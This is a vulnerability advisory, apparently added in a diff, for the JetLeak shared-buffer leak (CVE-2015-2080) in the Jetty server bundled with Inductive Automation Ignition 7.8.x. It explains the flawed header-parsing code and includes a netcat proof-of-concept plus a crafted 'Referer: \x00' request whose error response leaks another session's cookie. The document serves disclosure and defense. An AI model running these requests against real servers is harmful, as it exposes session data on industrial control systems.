@@ -1,0 +1,150 @@
+Inductive Automation Ignition 7.8.1 Remote Leakage Of Shared Buffers
+Vendor: Inductive Automation
+Product web page: http://www.inductiveautomation.com
+Affected version: 7.8.1 (b2016012216) and 7.8.0 (b2015101414)
+Platform: Java
+
+Summary: Ignition is a powerful industrial application platform with
+fully integrated development tools for building SCADA, MES, and IIoT
+solutions.
+
+Desc: Remote unauthenticated atackers are able to read arbitrary data
+from other HTTP sessions because Ignition uses a vulnerable Jetty server.
+When the Jetty web server receives a HTTP request, the below code is used
+to parse through the HTTP headers and their associated values. The server
+begins by looping through each character for a given header value and checks
+the following:
+
+- On Line 1164, the server checks if the character is printable ASCII or
+not a valid ASCII character.
+- On Line 1172, the server checks if the character is a space or tab.
+- On Line 1175, the server checks if the character is a line feed.
+- If the character is non-printable ASCII (or less than 0x20), then all
+of the checks above are skipped over and the code throws an ëIllegalCharacterí
+exception on line 1186, passing in the illegal character and a shared buffer.
+
+
+---------------------------------------------------------------------------
+File: jetty-http\src\main\java\org\eclipse\jetty\http\HttpParser.java
+---------------------------------------------------------------------------
+920: protected boolean parseHeaders(ByteBuffer buffer)
+921: {
+[..snip..]
+1163:     case HEADER_VALUE:
+1164:         if (ch>HttpTokens.SPACE || ch<0)
+1165:         {
+1166:             _string.append((char)(0xff&ch));
+1167:             _length=_string.length();
+1168:             setState(State.HEADER_IN_VALUE);
+1169:             break;
+1170:         }
+1171:
+1172:         if (ch==HttpTokens.SPACE || ch==HttpTokens.TAB)
+1173:            break;
+1174:
+1175:         if (ch==HttpTokens.LINE_FEED)
+1176:         {
+1177:             if (_length > 0)
+1178:             {
+1179:                 _value=null;
+1180:                 _valueString=(_valueString==null)?takeString():(_valueString+" "+takeString());
+1181:             }
+1182:             setState(State.HEADER);
+1183:             break;
+1184:         }
+1185:
+1186:         throw new IllegalCharacter(ch,buffer);
+---------------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN)
+           Microsoft Windows 7 Ultimate SP1 (EN)
+           Ubuntu Linux 14.04
+           Mac OS X
+           HP-UX Itanium
+           Jetty(9.2.z-SNAPSHOT)
+           Java/1.8.0_73
+           Java/1.8.0_66
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5306
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5306.php
+
+CVE: CVE-2015-2080
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2080
+
+Original: http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html
+Jetleak Test script: https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
+Eclipse: http://git.eclipse.org/c/jetty/org.eclipse.jetty.project.git/plain/advisories/2015-02-24-httpparser-error-buffer-bleed.md
+         https://github.com/eclipse/jetty.project/blob/jetty-9.2.x/advisories/2015-02-24-httpparser-error-buffer-bleed.md
+
+
+14.01.2016
+
+---
+
+
+#######################
+#!/bin/bash
+
+#RESOURCEPATH="/main/web/config/alarming.schedule?4674-1.IBehaviorListener.0-demo"
+RESOURCEPATH="/main/web/config/conf.modules?51461-4.IBehaviorListener.0-demo"
+BAD=$'\a'
+
+function normalRequest {
+echo "-- Normal Request --"
+
+nc localhost 8088 << NORMREQ
+POST $RESOURCEPATH HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded;charset=utf-8
+Connection: close
+Content-Length: 63
+
+NORMREQ
+}
+
+function badCookie {
+echo "-- Bad Cookie --"
+
+nc localhost 8088 << BADCOOKIE
+GET $RESOURCEPATH HTTP/1.1
+Host: localhost
+Coo${BAD}kie: ${BAD}
+
+BADCOOKIE
+}
+
+normalRequest
+echo ""
+echo ""
+badCookie
+
+#######################
+
+
+
+Original raw analysis request via proxy using Referer:
+------------------------------------------------------
+
+GET /main/web/config/conf.modules?51461-4.IBehaviorListener.0-demo&_=1452849939485 HTTP/1.1
+Host: localhost:8088
+Accept: application/xml, text/xml, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+Wicket-Ajax: true
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+Wicket-Ajax-BaseURL: config/conf.modules?51461
+Referer: \x00
+
+
+Response leaking part of Cookie session:
+----------------------------------------
+
+HTTP/1.1 400 Illegal character 0x0 in state=HEADER_VALUE in 'GET /main/web/con...461\r\nReferer: \x00<<<\r\nAccept-Encoding...tion: close\r\n\r\n>>>SESSIONID=15iwe0g...\x0fCU\xFa\xBf\xA4j\x12\x83\xCb\xE61~S\xD1'
+Content-Length: 0
+Connection: close
+Server: Jetty(9.2.z-SNAPSHOT)
